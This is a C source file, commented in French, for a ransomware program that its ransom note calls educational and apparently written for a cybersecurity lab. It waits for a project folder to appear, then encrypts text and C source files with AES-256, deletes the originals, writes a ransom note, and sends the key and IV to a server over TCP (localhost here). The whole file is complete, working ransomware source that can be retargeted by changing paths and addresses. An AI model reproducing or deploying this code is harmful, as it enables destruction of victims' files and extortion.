#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>
#include <dirent.h>
#include <fnmatch.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <arpa/inet.h>

#define CHECK_INTERVAL 5
#define WAIT_SECONDS 3600
#define PROJECT_PATH "TP/Projet"
#define TIMESTAMP_FILE "TP/.start_timestamp"
#define KEY_FILE "TP/.key"
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 4242

char CLE_HEX[65];
char IV_HEX[33];

// Vérifie si le dossier Projet existe
int dossier_existe(const char *chemin) {
    struct stat st;
    return stat(chemin, &st) == 0 && S_ISDIR(st.st_mode);
}

// Sauvegarde le timestamp de départ
void enregistrer_timestamp(const char *fichier) {
    FILE *fp = fopen(fichier, "w");
    if (!fp) {
        perror("Erreur d'ouverture du fichier de timestamp");
        return;
    }
    time_t maintenant = time(NULL);
    fprintf(fp, "%ld\n", maintenant);
    fclose(fp);
}

// Minuteur visible
void attendre_delai(int secondes) {
    printf("⏳ Attente de %d secondes avant chiffrement...\n", secondes);
    for (int i = secondes; i > 0; i--) {
        printf("\r⌛ Temps restant : %2d s", i);
        fflush(stdout);
        sleep(1);
    }
    printf("\n🚨 Délai écoulé. Début du chiffrement...\n");
}

// Vérifie si l'extension est ciblée
int est_fichier_a_chiffrer(const char *nom) {
    const char *extensions[] = {"*.txt", "*.md", "*.c", "*.h", NULL};
    for (int i = 0; extensions[i] != NULL; i++) {
        if (fnmatch(extensions[i], nom, 0) == 0) return 1;
    }
    return 0;
}

// Chiffre un fichier avec OpenSSL AES-256-CBC
int chiffrer_fichier(const char *chemin, const unsigned char *cle, const unsigned char *iv) {
    FILE *fin = fopen(chemin, "rb");
    if (!fin) return -1;

    char chemin_chiffre[512];
    snprintf(chemin_chiffre, sizeof(chemin_chiffre), "%s.enc", chemin);

    FILE *fout = fopen(chemin_chiffre, "wb");
    if (!fout) {
        fclose(fin);
        return -2;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, cle, iv);

    unsigned char buffer[1024], buffer_out[1040];
    int len, len_out;

    while ((len = fread(buffer, 1, sizeof(buffer), fin)) > 0) {
        EVP_EncryptUpdate(ctx, buffer_out, &len_out, buffer, len);
        fwrite(buffer_out, 1, len_out, fout);
    }

    EVP_EncryptFinal_ex(ctx, buffer_out, &len_out);
    fwrite(buffer_out, 1, len_out, fout);

    EVP_CIPHER_CTX_free(ctx);
    fclose(fin);
    fclose(fout);
    remove(chemin);  // Supprime le fichier original
    return 0;
}

// Parcourt le dossier et chiffre les bons fichiers
void chiffrer_dossier(const char *dossier, const unsigned char *cle, const unsigned char *iv) {
    DIR *dir = opendir(dossier);
    struct dirent *entry;
    char chemin_complet[512];

    if (!dir) {
        perror("Erreur d'ouverture du dossier");
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG && est_fichier_a_chiffrer(entry->d_name)) {
            snprintf(chemin_complet, sizeof(chemin_complet), "%s/%s", dossier, entry->d_name);
            printf("🔐 Chiffrement de : %s\n", chemin_complet);
            chiffrer_fichier(chemin_complet, cle, iv);
        }
    }

    closedir(dir);
}

// Génère le fichier de rançon
void generer_fichier_rancon(const char *dossier) {
    char chemin[512];
    snprintf(chemin, sizeof(chemin), "%s/RANÇON.txt", dossier);

    FILE *f = fopen(chemin, "w");
    if (!f) {
        perror("Erreur lors de la création de RANÇON.txt");
        return;
    }

    fprintf(f,
        "#########################################\n"
        "#        ❌  FICHIERS CHIFFRÉS  ❌       #\n"
        "#########################################\n\n"
        "Vos fichiers dans ce dossier ont été chiffrés par ProManager,\n"
        "car la date limite de remise du projet a été dépassée.\n\n"
        "Chaque fichier a été chiffré en AES-256 avec une clé unique.\n\n"
        "Ne tentez pas de modifier les fichiers `.enc`, vous risqueriez\n"
        "de les rendre irrécupérables.\n\n"
        "────────────────────────────────────────\n\n"
        "✅ Pour récupérer vos fichiers :\n\n"
        "1. Lancez le programme `client_decrypt` disponible dans le dossier TP/.\n"
        "2. Connectez-vous au serveur de l’administration :\n"
        "   → Adresse : 127.0.0.1\n"
        "   → Port    : 4242\n\n"
        "3. Rédigez un message d'excuse sincère (minimum 20 caractères).\n"
        "4. Si vos excuses sont acceptées, vous recevrez :\n"
        "   - La clé de déchiffrement\n"
        "   - Le vecteur d'initialisation (IV)\n\n"
        "────────────────────────────────────────\n\n"
        "📁 Fichiers chiffrés : tous les fichiers `.txt`, `.md`, `.c`, `.h`\n"
        "⏱️ Délai écoulé : 1h après la création du dossier Projet/\n\n"
        "🔐 Ransomware pédagogique développé dans le cadre du TP cybersécurité\n"
    );

    fclose(f);
}

// Sauvegarde la clé et l’IV dans TP/.key (pour test local)
void sauvegarder_cle_iv(const char *chemin, const unsigned char *cle, size_t cle_len,
                        const unsigned char *iv, size_t iv_len) {
    FILE *f = fopen(chemin, "w");
    if (!f) {
        perror("Erreur d'écriture du fichier .key");
        return;
    }

    fprintf(f, "CLE=");
    for (size_t i = 0; i < cle_len; i++)
        fprintf(f, "%02x", cle[i]);
    fprintf(f, "\n");

    fprintf(f, "IV=");
    for (size_t i = 0; i < iv_len; i++)
        fprintf(f, "%02x", iv[i]);
    fprintf(f, "\n");

    fclose(f);
}

void envoyer_cle_au_serveur(const char *ip, int port,
                             const unsigned char *cle, size_t cle_len,
                             const unsigned char *iv, size_t iv_len) {
    int sock;
    struct sockaddr_in serv_addr;
    char message[200];

    char cle_hex[65], iv_hex[33];
    for (size_t i = 0; i < cle_len; i++)
        sprintf(&cle_hex[i * 2], "%02x", cle[i]);
    cle_hex[64] = '\0';
    for (size_t i = 0; i < iv_len; i++)
        sprintf(&iv_hex[i * 2], "%02x", iv[i]);
    iv_hex[32] = '\0';

    snprintf(message, sizeof(message), "CLE=%s\nIV=%s\n", cle_hex, iv_hex);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &serv_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("❌ Erreur connexion au serveur");
        return;
    }

    write(sock, message, strlen(message));
    
    printf("📤 Clé/IV envoyées au serveur_pardon.\n");

    char reponse[100] = {0};
    read(sock, reponse, sizeof(reponse));
    printf("📨 Réponse serveur : %s\n", reponse);

    close(sock);
}

int main() {
    printf("👀 Surveillance de '%s'...\n", PROJECT_PATH);

    // Étape 1 : Surveillance
    while (1) {
        if (dossier_existe(PROJECT_PATH)) {
            printf("📁 Dossier détecté ! Démarrage du minuteur...\n");
            enregistrer_timestamp(TIMESTAMP_FILE);
            attendre_delai(WAIT_SECONDS);
            break;
        }
        sleep(CHECK_INTERVAL);
    }

    // Étape 2 : Génération clé AES et IV
    unsigned char cle[32];  // AES-256
    unsigned char iv[16];   // CBC
    RAND_bytes(cle, sizeof(cle));
    RAND_bytes(iv, sizeof(iv));

    // Étape 3 : Chiffrement des fichiers
    chiffrer_dossier(PROJECT_PATH, cle, iv);

    // Étape 4 : Génération du fichier rançon
    generer_fichier_rancon(PROJECT_PATH);

    // Étape 5 : Sauvegarde clé et IV (pour test local)
    sauvegarder_cle_iv(KEY_FILE, cle, sizeof(cle), iv, sizeof(iv));
    envoyer_cle_au_serveur(SERVER_IP, SERVER_PORT, cle, sizeof(cle), iv, sizeof(iv));

    printf("✅ Chiffrement terminé. Clé sauvegardée dans %s\n", KEY_FILE);
    return 0;
}
